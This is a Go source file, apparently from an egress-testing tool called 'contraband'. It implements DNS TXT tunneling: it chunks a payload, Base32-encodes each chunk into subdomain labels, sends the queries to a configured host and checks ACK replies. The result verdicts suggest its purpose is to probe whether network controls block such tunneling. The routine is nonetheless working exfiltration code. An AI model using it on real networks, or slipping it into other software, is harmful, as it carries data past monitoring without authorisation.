package dns

import (
	"context"
	"crypto/sha256"
	"encoding/base32"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	mdns "github.com/miekg/dns"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

// DNSTXTExfiltrator implements Base32 subdomain tunneling over DNS Type TXT queries with EDNS0 and TCP fallback.
type DNSTXTExfiltrator struct{}

func NewDNSTXTExfiltrator() *DNSTXTExfiltrator {
	return &DNSTXTExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoDNSTXT, NewDNSTXTExfiltrator())
}

func (e *DNSTXTExfiltrator) Protocol() string {
	return common.ProtoDNSTXT
}

func (e *DNSTXTExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	dnsChunkSize := 32
	if opts.ChunkSize > 0 && opts.ChunkSize < 32 {
		dnsChunkSize = opts.ChunkSize
	}

	var rawChunks [][]byte
	if len(payload) == 0 {
		rawChunks = [][]byte{{}}
	} else {
		for i := 0; i < len(payload); i += dnsChunkSize {
			end := i + dnsChunkSize
			if end > len(payload) {
				end = len(payload)
			}
			rawChunks = append(rawChunks, payload[i:end])
		}
	}
	totalChunks := uint32(len(rawChunks))

	domain := opts.Headers["domain"]
	if domain == "" {
		domain = "contraband.local"
	}
	domain = strings.TrimSuffix(domain, ".")

	udpClient := &mdns.Client{
		Timeout: opts.Timeout,
		Net:     "udp",
	}
	tcpClient := &mdns.Client{
		Timeout: opts.Timeout,
		Net:     "tcp",
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	b32Enc := base32.StdEncoding.WithPadding(base32.NoPadding)

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	for seq := uint32(1); seq <= totalChunks; seq++ {
		chunkData := rawChunks[seq-1]
		b32Chunk := b32Enc.EncodeToString(chunkData)
		if b32Chunk == "" {
			b32Chunk = "A"
		}

		fqdn := fmt.Sprintf("%d.%d.%s.%s.%s.", seq, totalChunks, opts.SessionToken.String(), b32Chunk, domain)
		if len(fqdn) > 255 {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("constructed FQDN exceeds 253 characters: length %d", len(fqdn))
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		msg := new(mdns.Msg)
		msg.SetQuestion(fqdn, mdns.TypeTXT)
		msg.SetEdns0(4096, false)
		msg.RecursionDesired = false

		resp, _, exErr := udpClient.ExchangeContext(ctx, msg, targetAddr)
		// Truncation fallback: if TC bit set or error indicating truncation, fall back to TCP
		if (exErr == nil && resp != nil && resp.Truncated) || (exErr != nil && strings.Contains(strings.ToLower(exErr.Error()), "truncate")) {
			resp, _, exErr = tcpClient.ExchangeContext(ctx, msg, targetAddr)
		}

		if exErr != nil {
			result.Verdict = classifyError(exErr)
			result.ErrorMessage = exErr.Error()
			calculateDurations(&result)
			return &result, exErr
		}

		result.BytesSent += int64(len(fqdn))
		if resp == nil || len(resp.Answer) == 0 {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("no TXT record answer received for chunk %d", seq)
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		var ackConfirmed bool
		for _, ans := range resp.Answer {
			if txtRecord, ok := ans.(*mdns.TXT); ok {
				for _, txt := range txtRecord.Txt {
					// Expected format: ACK:[seq]:[received]/[total]:[hash]
					if strings.HasPrefix(txt, fmt.Sprintf("ACK:%d:", seq)) {
						ackConfirmed = true
						result.BytesRecv += int64(len(txt))
						break
					}
				}
			}
		}

		if !ackConfirmed {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("invalid or missing TXT sequence ACK for chunk %d", seq)
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkData)); err != nil {
				result.Verdict = classifyError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)

	calculateDurations(&result)
	return &result, nil
}
